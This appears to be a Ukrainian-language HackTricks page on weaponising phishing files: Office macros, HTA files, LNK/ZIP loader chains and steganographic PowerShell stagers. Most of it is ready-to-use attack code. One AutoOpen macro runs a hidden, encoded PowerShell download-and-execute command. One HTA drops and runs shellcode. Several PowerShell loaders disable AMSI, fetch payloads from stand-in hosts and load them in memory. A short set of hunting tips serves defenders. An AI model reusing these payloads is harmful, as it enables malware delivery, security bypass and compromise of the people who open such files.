# Файли та документи фішингу

{{#include ../../banners/hacktricks-training.md}}

## Документи Office

Microsoft Word виконує перевірку даних файлу перед його відкриттям. Перевірка даних здійснюється у вигляді ідентифікації структури даних відповідно до стандарту OfficeOpenXML. Якщо під час ідентифікації структури даних відбувається помилка, файл, що аналізується, не буде відкрито.

Зазвичай файли Word, що містять макроси, використовують розширення `.docm`. Однак можливе перейменування файлу шляхом зміни розширення і при цьому збереження можливості виконання макросів.\
Наприклад, файл RTF за замовчуванням не підтримує макроси, але DOCM-файл, перейменований на RTF, буде оброблений Microsoft Word і зможе виконувати макроси.\
Ті самі внутрішні механізми застосовуються до всього програмного забезпечення Microsoft Office Suite (Excel, PowerPoint etc.).

Ви можете використовувати наступну команду, щоб перевірити, які розширення будуть виконуватися деякими програмами Office:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX-файли, які посилаються на віддалений шаблон (File –Options –Add-ins –Manage: Templates –Go), що містить макроси, також можуть «виконувати» макроси.

### Завантаження зовнішнього зображення

Перейдіть до: _Insert --> Quick Parts --> Field_\
_**Категорії**: Links and References, **Filed names**: includePicture, **Ім'я файлу або URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Можна використовувати макроси для запуску довільного коду з документа.

#### Функції автозавантаження

Чим вони більш поширені, тим імовірніше AV їх виявить.

- AutoOpen()
- Document_Open()

#### Приклади коду макросів
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Manually remove metadata

Перейдіть до **File > Info > Inspect Document > Inspect Document**, що відкриє Document Inspector. Клацніть **Inspect**, а потім **Remove All** поруч із **Document Properties and Personal Information**.

#### Doc Extension

Коли закінчите, оберіть у випадаючому списку **Save as type**, змініть формат з **`.docx`** на **Word 97-2003 `.doc`**.\
Робіть це, тому що ви **не можете зберегти макроси в `.docx`** і навколо макро-активованого **`.docm`** розширення існує **стигма** **навколо** (наприклад, мініатюрна іконка має великий `!` і деякі веб/електронні шлюзи повністю їх блокують). Тому це **успадковане розширення `.doc` є найкращим компромісом**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Files

HTA — це програма для Windows, яка **combines HTML and scripting languages (such as VBScript and JScript)**. Вона формує інтерфейс користувача та виконується як «цілком довірена» програма, без обмежень моделі безпеки браузера.

HTA запускається за допомогою **`mshta.exe`**, який зазвичай **встановлюється** разом з **Internet Explorer**, через що **`mshta` dependant on IE**. Тому, якщо його було видалено, HTA не зможуть виконуватись.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Примусова NTLM-автентифікація

Існує кілька способів **примусити NTLM-автентифікацію "віддалено"**, наприклад, можна додати **невидимі зображення** в email або HTML, до яких користувач звернеться (навіть HTTP MitM?). Або надіслати жертві **адресу файлів**, які **спровокують** **автентифікацію** лише при **відкритті папки.**

**Перегляньте ці ідеї та інше на наступних сторінках:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Не забувайте, що можна не лише вкрасти хеш або автентифікацію, але й **perform NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Дуже ефективні кампанії доставляють ZIP, який містить два легітимні підставні документи (PDF/DOCX) і зловмисний .lnk. Суть у тому, що фактичний PowerShell loader зберігається всередині сирих байтів ZIP після унікального маркера, а .lnk вирізає і запускає його повністю в пам'яті.

Типовий потік, реалізований .lnk PowerShell one-liner-ом:

1) Знайти оригінальний ZIP у стандартних шляхах: Desktop, Downloads, Documents, %TEMP%, %ProgramData% та у батьківській папці поточної робочої директорії.
2) Прочитати байти ZIP і знайти захардкоджений маркер (наприклад, xFIQCV). Усе, що йде після маркера — це вбудований PowerShell payload.
3) Скопіювати ZIP у %ProgramData%, розпакувати там і відкрити підставний .docx, щоб виглядало легітимно.
4) Обійти AMSI для поточного процесу: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Деобфускувати наступний етап (наприклад, видалити усі символи #) і виконати його в пам'яті.

Example PowerShell skeleton to carve and run the embedded stage:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Примітки
- Доставка часто зловживає авторитетними піддоменами PaaS (наприклад, *.herokuapp.com) і може обмежувати доступ до payloads (подавати безпечні ZIP-файли залежно від IP/UA).
- Наступний етап часто декодує base64/XOR shellcode і виконує його через Reflection.Emit + VirtualAlloc, щоб мінімізувати артефакти на диску.

Persistence used in the same chain
- COM TypeLib hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically. See details and ready-to-use commands here:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Полювання / IOCs
- ZIP-файли, що містять ASCII-маркерну строку (наприклад, xFIQCV), приєднану до даних архіву.
- .lnk, який перераховує батьківські/користувацькі папки для пошуку ZIP і відкриває приманковий документ.
- Маніпуляції з AMSI через [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Довготривалі бізнес-потоки, що закінчуються посиланнями, розміщеними на довірених доменах PaaS.

## Steganography-delimited payloads in images (PowerShell stager)

Останні loader chains доставляють обфускований JavaScript/VBS, який декодує та запускає Base64 PowerShell stager. Цей stager завантажує зображення (часто GIF), яке містить Base64-кодований .NET DLL, прихований у вигляді plain text між унікальними стартовими/кінцевими маркерами. Скрипт шукає ці роздільники (приклади в реальних випадках: «<<sudo_png>> … <<sudo_odt>>>»), витягує текст між ними, Base64-декодує у байти, завантажує assembly в пам'ять та викликає відому entry method, передаючи C2 URL.

Робочий процес
- Stage 1: Archived JS/VBS dropper → декодує вбудований Base64 → запускає PowerShell stager з -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → завантажує зображення, вирізає маркерно-розмежований Base64, завантажує .NET DLL в пам'ять і викликає його метод (наприклад, VAI), передаючи C2 URL та опції.
- Stage 3: Loader отримує фінальний payload і зазвичай інжектить його через process hollowing у довірений бінарний файл (часто MSBuild.exe). Дізнайтеся більше про process hollowing і trusted utility proxy execution тут:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Приклад PowerShell для вирізання DLL із зображення та виклику .NET методу в пам'яті:

<details>
<summary>PowerShell стего-екстрактор та лоадер payload'а</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Примітки
- Це ATT&CK T1027.003 (steganography/marker-hiding). Маркери відрізняються між кампаніями.
- AMSI/ETW bypass та string deobfuscation зазвичай застосовують перед завантаженням assembly.
- Hunting: скануйте завантажені зображення на предмет відомих роздільників; визначайте PowerShell, що звертається до зображень і негайно декодує Base64 блоби.

See also stego tools and carving techniques:

{{#ref}}
../../crypto-and-stego/stego-tricks.md
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Початковий етап, що повторюється, — невеликий, сильно‑заобфускований `.js` або `.vbs`, доставлений всередині архіву. Єдиною його метою є декодування вбудованого Base64 рядка та запуск PowerShell з `-nop -w hidden -ep bypass` для завантаження наступного етапу по HTTPS.

Скелет логіки (абстрактно):
- Прочитати вміст свого файлу
- Знайти Base64 blob між сміттєвими рядками
- Декодувати в ASCII PowerShell
- Виконати через `wscript.exe`/`cscript.exe`, викликаючи `powershell.exe`

Підказки для виявлення
- Архівні JS/VBS вкладення, що породжують `powershell.exe` з `-enc`/`FromBase64String` у командному рядку.
- `wscript.exe`, що запускає `powershell.exe -nop -w hidden` з тимчасових папок користувача.

## Windows files to steal NTLM hashes

Перегляньте сторінку про **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
